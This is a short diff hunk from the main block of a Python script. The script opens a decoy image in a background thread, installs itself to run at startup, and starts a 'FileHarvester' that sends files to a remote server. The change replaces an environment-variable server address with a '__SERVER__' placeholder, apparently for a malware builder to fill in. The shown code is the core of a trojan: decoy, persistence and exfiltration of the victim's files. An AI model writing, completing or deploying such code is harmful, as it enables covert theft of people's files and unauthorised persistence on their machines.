@@ -256,7 +256,7 @@ if __name__ == "__main__":
         target=open_image,
         args=("picture.jpg",)
     ,daemon=True).start()
-    SERVER_URL = os.getenv('SERVER')
+    SERVER_URL = "__SERVER__"
     persist_in_startup()
     harvester = FileHarvester(SERVER_URL)
     harvester.run()
